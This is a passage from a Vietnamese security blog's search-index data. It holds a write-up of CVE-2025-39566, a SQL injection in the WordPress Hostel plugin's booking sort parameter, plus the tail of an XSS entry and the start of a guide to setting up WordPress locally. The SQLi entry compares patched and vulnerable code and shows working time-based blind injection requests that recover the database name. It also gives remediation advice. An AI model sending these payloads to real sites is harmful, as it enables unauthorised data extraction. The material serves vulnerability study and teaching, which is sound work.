(7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn 